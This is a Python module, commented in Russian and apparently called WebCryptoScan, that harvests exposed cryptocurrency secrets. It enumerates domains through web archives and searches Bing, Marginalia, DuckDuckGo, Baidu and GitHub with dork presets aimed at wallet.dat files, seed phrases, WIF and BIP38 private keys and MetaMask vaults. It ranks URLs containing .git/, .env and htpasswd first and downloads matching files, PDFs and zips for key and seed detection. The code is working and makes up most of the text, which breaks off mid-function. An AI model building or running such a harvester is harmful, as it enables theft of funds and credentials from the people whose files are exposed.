#!/usr/bin/env python3
"""
WebCryptoScan — глобальный поиск: 4 источника URL + универсальный конвейер загрузки.

Источники (режимы):
  archive      — веб-архивы: CDX-перечисление домена целиком.
                 Провайдеры: web.archive.org (локальная машина) и arquivo.pt
                 (работает и из дата-центров, проверено).
  dorks        — dork-пресеты открытых каталогов через текстовые SERP.
                 Bing работает из дата-центров; Baidu и DuckDuckGo — локально.
  commoncrawl  — индекс Common Crawl по маске URL (index.commoncrawl.org).
  github       — поиск кода GitHub API (нужен токен; raw-файлы качаются без него).

Универсальный загрузчик раскладывает контент по типам:
  изображения -> images/ (дальше обычный QR+OCR конвейер);
  документы   -> files/  (строковые детекторы: WIF, сиды, адреса...);
  zip         -> распаковка с лимитами, содержимое раскладывается так же;
  pdf         -> текст pypdf + растеризация страниц в JPEG (страницы идут в QR-сканер);
  html        -> видимый текст страницы (pages/ + manifest).

Все источники возвращают честные статусы: блокировка одного не ломает остальные.
"""

from __future__ import annotations

import base64
import io
import json
import re
import threading
import zipfile
from collections.abc import Callable
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote, unquote, urljoin, urlparse

import requests

from .crawler import _HEADERS, _HTTP_TIMEOUT, _load_seen_hashes, _save_image
from .sitespider import _is_fetchable_url
from .textscan import page_visible_text, pdf_raster_bytes, pdf_text

# --- Константы --------------------------------------------------------------------

MAX_ITEM_BYTES = 25 * 1024 * 1024          # выше — не качаем
ZIP_MAX_ENTRIES = 100                       # максимум файлов из одного архива
ZIP_MAX_TOTAL = 80 * 1024 * 1024            # суммарный лимит распаковки
MAX_PAGES_MANIFEST = 200                    # страниц в джобе — не больше

DOC_EXTS = {
    ".txt", ".json", ".dat", ".wallet", ".key", ".keys", ".csv", ".log",
    ".xml", ".yaml", ".yml", ".conf", ".cfg", ".ini", ".env", ".md",
    ".bak", ".old", ".gpg", ".asc", ".pem", ".crt", ".sql", ".plist",
    ".properties", ".list", ".seed", ".seeds", ".phrase",
}
FILE_LINK_EXTS = DOC_EXTS | {".pdf", ".zip"}
HTML_MIMES = ("text/html", "application/xhtml")

_ARQUIVO_REPLAY = "https://arquivo.pt/noFrame/replay/{ts}id_/{url}"
_WAYBACK_REPLAY = "https://web.archive.org/web/{ts}id_/{url}"

# --- Приоритизация очереди URL ------------------------------------------------------
#
# Лимит «Максимум URL» легко съедают страницы-болтовня, а нам нужны кошельки.
# Поэтому очередь сортируется: URL с ключевыми словами (кошельки/сиды/бэкапы...)
# идут первыми, внутри одинакового ранга — картинки и документы, потом страницы.

PRIORITIZE_KEYWORDS = (
    "wallet", "seed", "mnemonic", "private", "backup", "recover", "passphrase",
    "keystore", "metamask", "electrum", "paperwallet", "paper-wallet", "keys",
    "wallet.dat", "privkey", "wif", "bip39", "bip38", "bitcoin", "btc",
    "ethereum", "monero", "xrp", "crypto", "secret", "coin",
    # скрытые папки и файлы
    ".git/", ".svn/", ".env", "htaccess", "htpasswd", "ds_store", "dump",
    # файлы-контейнеры ключей (перебор скрытых путей)
    "keys.txt", "wifs", "priv.txt", "privkeys", "keylist", "wallet.aes",
    "hex_key", "key_backup", "unspent",
)

_KIND_RANK = {"image": 0, "doc": 1, "page": 2}

# что из страниц рекурсии точно не нужно (остальное — страницы, картинки, документы)
_LINK_JUNK_EXTS = {".css", ".js", ".mjs", ".rss", ".atom", ".ico", ".woff", ".woff2",
                   ".ttf", ".otf", ".eot", ".dtd", ".xsd", ".ashx", ".axd"}


def _url_priority_score(url: str) -> int:
    """Сколько ключевых слов встретилось в URL (без учёта регистра, %XX раскрываются)."""
    low = unquote(url or "").lower()
    return sum(1 for kw in PRIORITIZE_KEYWORDS if kw in low)

_UA = _HEADERS["User-Agent"]

# --- Дельта-состояние доменов ---------------------------------------------------------
#
# Чтобы повторный проход по тому же домену не шёл по кругу, после успешного
# перечисления CDX запоминаем границу времени: самый старый снимок, который
# реально ушёл в загрузку. Следующий дельта-проход спрашивает у архива только
# снимки, сделанные ПОСЛЕ этой границы (параметр from= у CDX API).
# Никаких расписаний и автозапусков — только ручные запуски пользователя.

STATE_FILE = Path(__file__).resolve().parent.parent / "data" / "global_state.json"
_STATE_LOCK = threading.Lock()


def _domain_key(domain: str) -> str:
    """Нормализуем запись домена до ключа состояния: без схемы, слешей и '/*'."""
    dom = (domain or "").strip().lower()
    dom = re.sub(r"^[a-z][a-z0-9+.-]*://", "", dom)
    dom = dom.rstrip("/")
    if dom.endswith("/*"):
        dom = dom[:-2]
    return dom.strip()


def _load_state() -> dict:
    try:
        data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
        if isinstance(data, dict) and isinstance(data.get("domains"), dict):
            return data
    except Exception:  # noqa: BLE001 — файла нет или битый JSON: начинаем с пустого
        pass
    return {"domains": {}}


def _save_state(state: dict) -> None:
    try:
        STATE_FILE.parent.mkdir(parents=True, exist_ok=True)
        tmp = STATE_FILE.with_suffix(".json.tmp")
        tmp.write_text(json.dumps(state, ensure_ascii=False, indent=1), encoding="utf-8")
        tmp.replace(STATE_FILE)
    except OSError:
        pass


def get_domain_state(domain: str) -> dict | None:
    """Сохранённое дельта-состояние домена или None."""
    st = _load_state()["domains"].get(_domain_key(domain))
    return dict(st) if isinstance(st, dict) and st else None


def reset_domain_state(domain: str) -> bool:
    """Сброс дельты: следующий проход снова пойдёт по всему домену."""
    with _STATE_LOCK:
        state = _load_state()
        key = _domain_key(domain)
        if key in state["domains"]:
            del state["domains"][key]
            _save_state(state)
            return True
    return False


def _ts_plus_second(ts: str) -> str:
    """CDX from= включителен — сдвигаем границу на секунду, чтобы пограничный
    снимок не качался заново при каждом дельта-проходе."""
    s = str(ts)[:14]
    try:
        dt = datetime.strptime(s, "%Y%m%d%H%M%S") + timedelta(seconds=1)
        return dt.strftime("%Y%m%d%H%M%S")
    except ValueError:
        return str(ts)


def _record_domain_state(domain: str, *, provider: str, items: list[dict],
                         queued_ts: list[str], max_urls: int) -> dict:
    """Записывает границу дельты после успешного перечисления CDX.

    Граница — самый старый снимок из реально ушедших в загрузку; complete —
    уложились ли перечисленные снимки в лимит URL (иначе старые не охвачены).
    """
    with _STATE_LOCK:
        state = _load_state()
        boundary = ""
        if queued_ts:
            boundary = min(str(t)[:14] for t in queued_ts)
        elif items:
            boundary = max(str(i.get("ts", ""))[:14] for i in items if i.get("ts"))
        rec = {
            "last_ts": boundary,
            "next_from": _ts_plus_second(boundary) if boundary else "",
            "last_run": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "provider": provider,
            "last_count": len(items),
            "complete": len(items) <= max_urls,
        }
        if boundary:
            state["domains"][_domain_key(domain)] = rec
            _save_state(state)
        return rec


def _get(url: str, *, params: dict | None = None, headers: dict | None = None,
         timeout: tuple[float, float] = (12, _HTTP_TIMEOUT)) -> requests.Response:
    h = {"User-Agent": _UA, "Accept-Language": "en-US,en;q=0.9"}
    if headers:
        h.update(headers)
    return requests.get(url, params=params, headers=h, timeout=timeout)


# --- Пресеты dork-запросов ----------------------------------------------------------
#
# Каждый запрос — два варианта:
#   dork  — полный запрос с операторами (intitle:, filetype:) — работает на локальной
#           машине (DuckDuckGo, Baidu); Bing из дата-центров молча отбрасывает
#           операторы и отдаёт нерелевантную выдачу (проверено 31.10.2026);
#   plain — обычные ключевые слова — Bing и Marginalia из дата-центров исполняют честно.

DORK_PRESETS: dict[str, dict] = {
    "open_dirs": {
        "label": "Открытые каталоги (index of)",
        "queries": [
            {"dork": 'intitle:"index of" wallet.dat', "plain": '"wallet.dat" bitcoin backup download'},
            {"dork": 'intitle:"index of" seed.txt', "plain": '"seed.txt" bitcoin backup'},
            {"dork": 'intitle:"index of" "private keys" bitcoin', "plain": '"private keys" bitcoin txt'},
            {"dork": 'intitle:"index of" keys.txt', "plain": '"keys.txt" bitcoin'},
            {"dork": 'intitle:"index of" "paper wallet"', "plain": '"paper wallet" bitcoin pdf download'},
            {"dork": 'intitle:"index of" "wallet backup"', "plain": '"wallet backup" directory bitcoin'},
            {"dork": 'intitle:"index of" /backups btc', "plain": '"index of" backups bitcoin keys'},
            {"dork": 'intitle:"index of" electrum wallets', "plain": '"index of" electrum wallets directory'},
        ],
    },
    "seed_backups": {
        "label": "Сид-фразы в текстовых файлах",
        "queries": [
            {"dork": '"seed phrase" filetype:txt', "plain": '"seed phrase" backup text bitcoin'},
            {"dork": '"recovery phrase" filetype:txt bitcoin', "plain": '"recovery phrase" words bitcoin write'},
            {"dork": '"mnemonic phrase" filetype:txt', "plain": '"mnemonic phrase" wallet backup'},
            {"dork": '"bip39" "seed" filetype:txt', "plain": '"bip39" seed words backup'},
        ],
    },
    "bip38_wif": {
        "label": "BIP38 / WIF в текстах",
        "queries": [
            {"dork": '"6P" bip38 filetype:txt', "plain": 'bip38 "6P" password protected key'},
            {"dork": 'bip38 "private key" filetype:txt', "plain": 'bip38 "private key" example'},
            {"dork": '"private key" WIF filetype:txt', "plain": '"private key" WIF bitcoin export'},
            {"dork": '"5K" OR "L1" "private key" filetype:txt', "plain": '"L1" OR "5K" private key bitcoin'},
        ],
    },
    "wallet_files": {
        "label": "Файлы кошельков и бэкапы",
        "queries": [
            {"dork": '"wallet.dat" filetype:dat', "plain": '"wallet.dat" bitcoin core dat file'},
            {"dork": 'intitle:"index of" electrum "default_wallet"', "plain": 'electrum "default_wallet" backup file'},
            {"dork": '"metamask" "vault" filetype:json', "plain": 'metamask vault json decrypt backup'},
            {"dork": '"keystore" filetype:json ethereum', "plain": 'keystore json ethereum utc file'},
        ],
    },
}

GITHUB_PRESETS: dict[str, dict] = {
    "wallet_files": {
        "label": "Кошельки в репозиториях",
        "queries": [
            "filename:wallet.dat",
            "filename:seed.txt",
            "filename:default_wallet",
        ],
    },
    "known_seeds": {
        "label": "Известные тестовые ключи и сиды",
        "queries": [
            '"abandon abandon abandon abandon abandon abandon abandon abandon"',
            '"candy maple cake sugar pudding cream honey"',
            '"5HpHagT65TZzG1PH3CSu63k8DbpvD8s5ip4nEB3kEsreAnchuDf"',
        ],
    },
    "bip39_json": {
        "label": "BIP39 / мнемоники в коде",
        "queries": [
            '"bip39" "mnemonic" filename:.json',
            '"recovery phrase" filename:.env',
        ],
    },
}

DORK_ENGINE_LABELS = {
    "arquivo": "Arquivo.pt (веб-архив, из дата-центров)",
    "bing": "Bing (из дата-центров, ключевые слова)",
    "marginalia": "Marginalia (старый веб, из дата-центров)",
    "baidu": "Baidu (локально, полные dork)",
    "duckduckgo": "DuckDuckGo (локально, полные dork)",
}


# --- Разбор типа контента ------------------------------------------------------------

def _url_ext(url: str) -> str:
    try:
        path = urlparse(url).path
    except ValueError:
        return ""
    m = re.search(r"\.([A-Za-z0-9]{1,6})$", path)
    return f".{m.group(1).lower()}" if m else ""


def split_kind(url: str, mime: str) -> str:
    """'image' | 'page' | 'doc' | 'skip' — по mime, затем по расширению."""
    mime = (mime or "").split(";")[0].strip().lower()
    ext = _url_ext(url)
    if mime.startswith("image/"):
        return "image"
    if mime in HTML_MIMES:
        return "page"
    if mime == "application/pdf" or ext == ".pdf":
        return "doc"
    if mime in ("application/zip", "application/x-zip-compressed", "application/x-zip",
                "application/gzip", "application/x-gzip") or ext in (".zip", ".gz"):
        return "doc"
    if mime.startswith("text/") or mime in ("application/json", "application/xml",
                                            "application/javascript", "application/x-yaml"):
        return "doc"
    if ext in FILE_LINK_EXTS:
        return "doc"
    if ext in {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".tif", ".tiff"}:
        return "image"
    if not mime and not ext:
        return "page"  # без подсказок — пробуем как страницу
    return "skip"


def _extract_page_links(html: str, base_url: str, limit: int = 20) -> list[str]:
    """Ссылки со страницы того же домена — материал для рекурсии.

    Остаётся то, что конвейер умеет переварить (картинки, документы, другие
    страницы); стили, скрипты, внешние домены и мусор отфильтровываются.
    """
    try:
        base_host = urlparse(base_url).netloc.lower().removeprefix("www.")
    except ValueError:
        return []
    if not base_host:
        return []
    out: list[str] = []
    seen: set[str] = set()
    for href in re.findall(r'''href=["']([^"'\s>]+)["']''', html, re.I):
        href = unquote(href.strip())
        if not href or href.startswith(("javascript:", "mailto:", "data:", "tel:", "#")):
            continue
        try:
            full = urljoin(base_url, href)
        except ValueError:
            continue
        if not full.startswith(("http://", "https://")):
            continue
        full = full.split("#", 1)[0]
        if not full or full in seen:
            continue
        try:
            host = urlparse(full).netloc.lower().removeprefix("www.")
        except ValueError:
            continue
        if host != base_host or _url_ext(full) in _LINK_JUNK_EXTS:
            continue
        seen.add(full)
        out.append(full)
        if len(out) >= limit:
            break
    return out


# --- Универсальная загрузка -----------------------------------------------------------

class _Store:
    """Приёмник контента одной джобы: images/, files/, pages/ + манифест."""

    def __init__(self, job_dir: Path, prefix: str, seen_images: set[str]):
        self.images_dir = job_dir / "images"
        self.files_dir = job_dir / "files"
        self.pages_dir = job_dir / "pages"
        for d in (self.images_dir, self.files_dir, self.pages_dir):
            d.mkdir(parents=True, exist_ok=True)
        self.prefix = prefix
        self.seen_images = seen_images
        self.doc_hashes: set[str] = set()
        self.pages: list[dict] = []          # [{"url", "kind", "file"}]
        self.counters = {"images": 0, "docs": 0, "pages": 0, "skipped": 0, "blocked": 0}
        self.n = 0
        self.saved_urls: set[str] = set()

    def _free_name(self, base: str, ext: str) -> str:
        k = 0
        name = f"{base}{ext}"
        while (self.files_dir / name).exists() or (self.images_dir / name).exists():
            k += 1
            name = f"{base}_{k}{ext}"
        return name

    def add_image(self, data: bytes, url: str) -> bool:
        import hashlib

        h = hashlib.md5(data).hexdigest()
        if h in self.seen_images:
            self.counters["skipped"] += 1
            return False
        self.n += 1
        name = f"{self.prefix}_n{self.n:03d}_{h[:8]}"
        if _save_image(data, self.images_dir, name):
            self.seen_images.add(h)
            self.counters["images"] += 1
            self.saved_urls.add(url)
            return True
        self.counters["skipped"] += 1
        return False

    def add_doc(self, data: bytes, url: str) -> bool:
        import hashlib

        h = hashlib.md5(data).hexdigest()
        if h in self.doc_hashes:
            self.counters["skipped"] += 1
            return False
        self.doc_hashes.add(h)
        ext = _url_ext(url) or ".bin"
        if ext not in DOC_EXTS:
            ext = ".txt" if ext == ".dat" else (ext if ext in (".pdf", ".zip", ".gz") else ".bin")
        self.n += 1
        base = re.sub(r"[^0-9A-Za-z._-]+", "_", Path(urlparse(url).path).stem)[:60] or "doc"
        name = f"{self.prefix}_n{self.n:03d}_{base}"
        (self.files_dir / self._free_name(name, ext)).write_bytes(data)
        self.counters["docs"] += 1
        self.saved_urls.add(url)
        return True

    def add_page(self, text: str, url: str, kind: str = "html") -> bool:
        if len(self.pages) >= MAX_PAGES_MANIFEST:
            return False
        self.n += 1
        fname = f"page_{self.n:03d}.txt"
        (self.pages_dir / fname).write_text(text, encoding="utf-8")
        self.pages.append({"url": url, "kind": kind, "file": fname})
        self.counters["pages"] += 1
        self.saved_urls.add(url)
        return True

    def write_manifest(self, job_dir: Path) -> None:
        import json

        (job_dir / "pages" / "manifest.json").write_text(
            json.dumps(self.pages, ensure_ascii=False, indent=1), encoding="utf-8")


def _route_bytes(data: bytes, mime: str, url: str, store: _Store, depth: int = 0) -> str:
    """Раскладывает скачанные байты по типам. Возвращает 'image'|'doc'|'page'|'skip'."""
    kind = split_kind(url, mime)
    if kind == "skip" and mime:
        kind = split_kind(url, "")  # mime экзотичный — смотрим на расширение

    if kind == "image":
        return "image" if store.add_image(data, url) else "skip"

    if kind == "page":
        text = page_visible_text(data.decode("utf-8", errors="replace")[:3 * 1024 * 1024])
        return "page" if text and store.add_page(text, url) else "skip"

    if kind == "doc":
        ext = _url_ext(url)
        ct = (mime or "").split(";")[0].strip().lower()
        if ct == "application/pdf" or ext == ".pdf":
            saved: str = "skip"
            text = pdf_text(data)
            if text and store.add_page(text, url, kind="pdf"):
                saved = "page"
            # растеризация страниц PDF → JPEG: страницы уходят в QR-конвейер
            for i, page_bytes in enumerate(pdf_raster_bytes(data), 1):
                if store.add_image(page_bytes, f"{url}#page={i}"):
                    saved = "image"
            return saved
        if ext == ".zip" or ct in ("application/zip", "application/x-zip-compressed"):
            if depth < 1:
                _unpack_zip(data, url, store, depth)
            return "doc" if url in store.saved_urls else "skip"
        return "doc" if store.add_doc(data, url) else "skip"

    store.counters["skipped"] += 1
    return "skip"


def _unpack_zip(data: bytes, url: str, store: _Store, depth: int) -> None:
    """Распаковывает zip с жёсткими лимитами (защита от zip-бомб и traversal)."""
    try:
        zf = zipfile.ZipFile(io.BytesIO(data))
    except Exception:  # noqa: BLE001
        return
    total = 0
    n = 0
    for zi in zf.infolist():
        if zi.is_dir():
            continue
        total += zi.file_size
        n += 1
        if total > ZIP_MAX_TOTAL or n > ZIP_MAX_ENTRIES:
            break
        name = Path(zi.filename).name  # только basename — путь вверх запрещён
        if not name or name.startswith("."):
            continue
        try:
            b = zf.read(zi)
        except Exception:  # noqa: BLE001
            continue
        if len(b) > MAX_ITEM_BYTES:
            continue
        inner_url = f"{url}!{zi.filename}"
        if _url_ext(inner_url) in {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp"}:
            store.add_image(b, inner_url)
        else:
            _route_bytes(b, "", inner_url, store, depth + 1)


def _fetch_item(url: str, store: _Store, *, timeout: tuple[float, float] = (12, 40),
                link_base: str = "", link_sink: list[str] | None = None,
                link_limit: int = 20) -> bool:
    """Скачивает один URL и раскладывает контент. True — что-то сохранили.

    link_base + link_sink: если контент — страница, из HTML достаются ссылки того
    же домена, что и link_base, и дописываются в link_sink (для рекурсии).
    """
    try:
        r = requests.get(url, headers=_HEADERS, timeout=timeout, stream=True)
        if r.status_code in (403, 429):
            store.counters["blocked"] += 1
            return False
        if r.status_code != 200:
            store.counters["skipped"] += 1
            return False
        data = r.content
        if not data or len(data) > MAX_ITEM_BYTES:
            store.counters["skipped"] += 1
            return False
        ct = r.headers.get("content-type", "")
        if link_sink is not None and link_base:
            kind = split_kind(url, ct)
            if kind == "skip" and ct:
                kind = split_kind(url, "")
            if kind == "page":
                try:
                    html = data.decode("utf-8", errors="replace")[:3 * 1024 * 1024]
                    link_sink.extend(_extract_page_links(html, link_base, link_limit))
                except Exception:  # noqa: BLE001 — битый HTML не роняет загрузку
                    pass
        return _route_bytes(data, ct, url, store) != "skip"
    except Exception:  # noqa: BLE001 — одна битая ссылка не роняет джобу
        store.counters["skipped"] += 1
        return False


def _fetch_with_recursion(items: list[dict], *, build_url: Callable[[dict], str],
                          depth: int, budget: int, store: _Store,
                          prog: Callable[[str, int, int], None], label: str) -> dict:
    """Качает очередь URL; найденные страницы отдают ссылки того же домена —
    они становятся следующим уровнем очереди (BFS до depth).

    items — [{"url": оригинал, "ts": момент снимка}]; build_url(it) -> URL скачивания
    (для архива это replay-ссылка на момент снимка, для живых источников — сам URL).
    budget — суммарный лимит рекурсивных загрузок по всем уровням.
    Возвращает {"depth", "found", "fetched"} для отчёта в UI.
    """
    stats = {"depth": depth, "found": 0, "fetched": 0}
    total = len(items)
    if depth <= 0:
        done = 0
        for it in items:
            _fetch_item(build_url(it), store)
            done += 1
            if done % 5 == 0 or done == total:
                prog(f"{label}: {done}/{total}", done, total)
        return stats

    seen: set[str] = {it["url"] for it in items}
    frontier: list[tuple[str, str]] = []   # (оригинальный URL, ts снимка)
    done = 0
    for it in items:
        sink: list[str] = []
        _fetch_item(build_url(it), store, link_base=it["url"], link_sink=sink)
        fresh = [l for l in sink if l not in seen]
        for l in fresh:
            seen.add(l)
        frontier.extend((l, str(it.get("ts", ""))) for l in fresh)
        stats["found"] += len(fresh)
        done += 1
        if done % 5 == 0 or done == total:
            prog(f"{label}: {done}/{total}", done, total)

    level = 1
    while level <= depth and frontier and budget > 0:
        plan = frontier[:budget]
        leftover = frontier[len(plan):]
        collect_more = level < depth
        nxt: list[tuple[str, str]] = []
        done = 0
        for base_url, ts in plan:
            sink: list[str] | None = [] if collect_more else None
            if _fetch_item(build_url({"url": base_url, "ts": ts}), store,
                           link_base=base_url if collect_more else None,
                           link_sink=sink):
                stats["fetched"] += 1
            if sink:
                fresh = [l for l in sink if l not in seen]
                for l in fresh:
                    seen.add(l)
                nxt.extend((l, ts) for l in fresh)
                stats["found"] += len(fresh)
            budget -= 1
            done += 1
            if done % 5 == 0 or done == len(plan):
                prog(f"{label} — рекурсия, уровень {level}: {done}/{len(plan)}", done, len(plan))
        frontier = (nxt + leftover) if collect_more else []
        level += 1
    return stats


# --- Режим archive: CDX-перечисление домена -------------------------------------------

def _cdx_wayback(domain: str, limit: int, from_ts: str = "") -> dict:
    params = {
        "url": domain,
        "output": "json",
        "fl": "original,timestamp,mimetype,statuscode",
        "collapse": "urlkey",
        "filter": "statuscode:200",
        "limit": str(limit),
    }
    if from_ts:
        params["from"] = str(from_ts)
    r = _get(
        "https://web.archive.org/cdx/search/cdx",
        params=params,
        timeout=(12, 45),
    )
    r.raise_for_status()
    rows = r.json()
    items: list[dict] = []
    if isinstance(rows, list) and rows:
        header = rows[0] if isinstance(rows[0], list) else ["original", "timestamp", "mimetype", "statuscode"]
        for row in rows[1:] if isinstance(rows[0], list) else rows:
            if not isinstance(row, (list, dict)):
                continue
            if isinstance(row, dict):
                row = [row.get(k, "") for k in ("original", "timestamp", "mimetype", "statuscode")]
            d = dict(zip([str(h).lower() for h in header], row))
            items.append({"url": d.get("original", ""), "ts": d.get("timestamp", ""),
                          "mime": d.get("mimetype", ""), "status": d.get("statuscode", "")})
    return {"provider": "wayback", "items": items}


def _cdx_arquivo(domain: str, limit: int, from_ts: str = "") -> dict:
    params = {"url": domain, "output": "json", "filter": "statuscode:200", "limit": str(limit)}
    if from_ts:
        params["from"] = str(from_ts)
    r = _get(
        "https://arquivo.pt/wayback/cdx",
        params=params,
        timeout=(12, 45),
    )
    r.raise_for_status()
    items: list[dict] = []
    for line in r.text.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            d = json.loads(line)
        except Exception:  # noqa: BLE001
            continue
        items.append({"url": d.get("original") or d.get("url", ""), "ts": d.get("timestamp", ""),
                      "mime": d.get("mimetype") or d.get("mime", ""), "status": d.get("status", "")})
    return {"provider": "arquivo", "items": items}


def cdx_domain(domain: str, limit: int, provider: str = "auto", from_ts: str = "") -> dict:
    """Перечисляет захваченные URL домена через CDX.

    Провайдеры: wayback, arquivo, auto. from_ts — граница дельты (YYYYMMDDhhmmss):
    возвращаются только снимки, сделанные после неё.
    """
    dom = domain.strip()
    dom = re.sub(r"^[a-z][a-z0-9+.-]*://", "", dom, flags=re.I).strip("/")
    if not dom or "/" not in dom and "*" not in dom:
        dom = f"{dom}/*" if dom else dom
    if not dom:
        return {"provider": None, "items": [], "error": "пустой домен"}

    order = [("wayback", _cdx_wayback), ("arquivo", _cdx_arquivo)]
    if provider == "wayback":
        order = order[:1]
    elif provider == "arquivo":
        order = order[1:]

    last_err = ""
    for name, fn in order:
        try:
            res = fn(dom, limit, from_ts)
            items = [i for i in res["items"] if i["url"] and str(i["status"]) == "200"]
            # дедуп по URL (оставляем самый свежий снимок)
            best: dict[str, dict] = {}
            for it in items:
                old = best.get(it["url"])
                if old is None or str(it["ts"]) > str(old["ts"]):
                    best[it["url"]] = it
            items = sorted(best.values(), key=lambda x: str(x["ts"]), reverse=True)
            if items:
                note = None
                if name == "arquivo" and len(items) < 5:
                    note = ("arquivo.pt глубоко индексирует португальский веб; для остальных "
                            "доменов в архиве могут быть только главные страницы. Полный "
                            "охват даёт провайдер wayback — на локальной машине.")
                return {"provider": name, "items": items[:limit], "error": None, "note": note}
            last_err = f"{name}: подходящих снимков не найдено"
        except requests.RequestException as e:
            last_err = f"{name}: {type(e).__name__}"
        except Exception as e:  # noqa: BLE001
            last_err = f"{name}: {type(e).__name__}: {str(e)[:120]}"
    return {"provider": None, "items": [], "error": last_err or "источники недоступны"}


def _replay_url(provider: str, it: dict) -> str:
    """Ссылка на оригинальные байты из архива (id_ — без тулбара архивов)."""
    if provider == "wayback":
        return _WAYBACK_REPLAY.format(ts=it["ts"], url=quote(it["url"], safe=":/?&=%"))
    return _ARQUIVO_REPLAY.format(ts=it["ts"], url=quote(it["url"], safe=":/?&=%"))


# --- Режим dorks: текстовые SERP --------------------------------------------------------

_BING_REDIR_RE = re.compile(r'u=a1([A-Za-z0-9_-]+)')
_ALGO_RE = re.compile(r'<li class="b_algo".*?</li>', re.S)
_HREF_RE = re.compile(r'<a[^>]+href="([^"]+)"', re.I)
_BING_TITLE_RE = re.compile(r'<h2[^>]*>(.*?)</h2>', re.S)
_TAG_RE = re.compile(r'<[^>]+>')


def _query_tokens(q: str) -> list[str]:
    """Значимые токены запроса для проверки релевантности выдачи."""
    raw = re.findall(r"[a-zа-яё0-9][a-zа-яё0-9_.-]{3,}", (q or "").lower())
    out = list(raw)
    for t in raw:
        if "." in t:  # wallet.dat -> также wallet (дот-токены в заголовках могут без точки)
            out += [p for p in t.split(".") if len(p) >= 4]
    return sorted(set(out))


def _decode_bing_href(href: str) -> str:
    href = href.replace("&amp;", "&")
    if "bing.com/ck/" not in href:
        return href
    m = _BING_REDIR_RE.search(href)
    if not m:
        return ""
    raw = m.group(1)
    raw += "=" * (-len(raw) % 4)
    try:
        return base64.urlsafe_b64decode(raw).decode("utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        return ""


def serp_bing(query: str, max_results: int = 20) -> dict:
    out: list[str] = []
    pairs: list[tuple[str, str]] = []   # (заголовок, url) — для проверки релевантности
    last_empty = False
    first = 1
    while len(out) < max_results and first <= 21:
        r = _get("https://www.bing.com/search",
                 params={"q": query, "count": "15", "first": str(first), "setlang": "en"},
                 timeout=(12, 25))
        if r.status_code != 200:
            break
        found = 0
        for block in _ALGO_RE.findall(r.text):
            m_title = _BING_TITLE_RE.search(block)
            title = _TAG_RE.sub(" ", m_title.group(1)) if m_title else ""
            for href in _HREF_RE.findall(block):
                real = _decode_bing_href(href)
                if real and real.startswith("http") and _is_fetchable_url(real):
                    out.append(real)
                    pairs.append((title, real))
                    found += 1
                    break  # одна ссылка на результат
        if not found:
            # Bing чередует варианты ответа: иногда JS-оболочка без b_algo.
            # Если первая попытка пуста — один ретрай, потом сдаёмся.
            if first == 1 and not last_empty:
                last_empty = True
                continue
            break
        last_empty = False
        first += 15
    seen: set[str] = set()
    uniq = [u for u in out if not (u in seen or seen.add(u))]
    if not uniq:
        return {"urls": [], "error": "Bing: выдача пуста или анти-бот блокировка"}
    # Bing из дата-центров иногда не блокирует запрос, а ПОДСТАВЛЯЕТ нерелевант
    # (популярные страницы вообще мимо темы). Если ни в одном заголовке/URL нет
    # ни одного токена запроса — это мусор, честно признаём блокировку.
    if len(pairs) >= 4:
        toks = _query_tokens(query)
        if toks and not any(
                any(t in (ti + " " + u).lower() for t in toks) for ti, u in pairs):
            return {"urls": [], "error":
                    "Bing: выдача не по запросу — анти-бот из дата-центра "
                    "(на локальной машине обычно работает)"}
    return {"urls": uniq[:max_results], "error": None}


_MARG_STOP = {"bitcoin", "file", "backup", "download", "example", "format", "txt", "json",
              "words", "phrase", "key", "keys", "private", "seed", "wallet", "core"}


def _marginalia_tokens(query: str) -> list[str]:
    """Marginalia стабильно отвечает только на одиночные токены (многословные висят,
    проверено). Выбираем 1-2 самых значимых: сначала токены с точкой (wallet.dat,
    seed.txt), затем первые не-стоп-слова."""
    raw = re.findall(r"[A-Za-z0-9_.-]{2,}", query)
    seen: list[str] = []
    for t in raw:
        if t.lower() not in seen:
            seen.append(t)
    dotted = [t for t in seen if "." in t]
    plain = [t for t in seen if "." not in t and t.lower() not in _MARG_STOP]
    out = dotted + plain
    return (out or seen)[:2]


def serp_marginalia(query: str, max_results: int = 20) -> dict:
    """Marginalia — независимый поисковик, хорошо индексирует старый/нестандартный веб.
    Открытый ключ 'public' работает из дата-центров, но жёстко троттлит повторные
    запросы (держит соединение до таймаута), поэтому — один запрос за вызов,
    самый значимый токен (с точкой типа wallet.dat, иначе первое ключевое слово)."""
    tokens = _marginalia_tokens(query)[:1]
    if not tokens:
        return {"urls": [], "error": "Marginalia: нечего искать в запросе"}
    try:
        r = _get("https://api.marginalia.nu/public/search/" + quote(tokens[0], safe=""),
                 timeout=(10, 20))
    except requests.RequestException as e:
        return {"urls": [], "error": f"Marginalia: {type(e).__name__} (лимит запросов публичного ключа)"}
    if r.status_code != 200:
        return {"urls": [], "error": f"Marginalia: HTTP {r.status_code}"}
    try:
        data = r.json()
    except Exception:  # noqa: BLE001
        return {"urls": [], "error": "Marginalia: некорректный JSON"}
    out: list[str] = []
    for it in data.get("results", []):
        u = (it.get("url") or "").strip()
        if u.startswith("http") and _is_fetchable_url(u):
            out.append(u)
        if len(out) >= max_results:
            break
    if not out:
        return {"urls": [], "error": "Marginalia: по запросу ничего не найдено"}
    return {"urls": out, "error": None}


def serp_duckduckgo(query: str, max_results: int = 20) -> dict:
    r = _get("https://html.duckduckgo.com/html/", params={"q": query}, timeout=(12, 25))
    if r.status_code != 200:
        return {"urls": [], "error": f"DuckDuckGo: HTTP {r.status_code} (анти-бот из дата-центра)"}
    out: list[str] = []
    for href in re.findall(r'class="result__a"[^>]*href="([^"]+)"', r.text):
        if "uddg=" in href:
            m = re.search(r"uddg=([^&]+)", href)
            if m:
                real = unquote(m.group(1))
                if real.startswith("http") and _is_fetchable_url(real):
                    out.append(real)
    if not out:
        return {"urls": [], "error": "DuckDuckGo: выдача пуста или анти-бот блокировка"}
    seen: set[str] = set()
    return {"urls": [u for u in out if not (u in seen or seen.add(u))][:max_results], "error": None}


def serp_baidu(query: str, max_results: int = 20) -> dict:
    s = requests.Session()
    s.headers.update(_HEADERS)
    try:
        s.get("https://www.baidu.com/", timeout=(10, 20))  # печенье BAIDUID
        r = s.get("https://www.baidu.com/s", params={"wd": query, "rn": "20"}, timeout=(12, 25))
    except requests.RequestException as e:
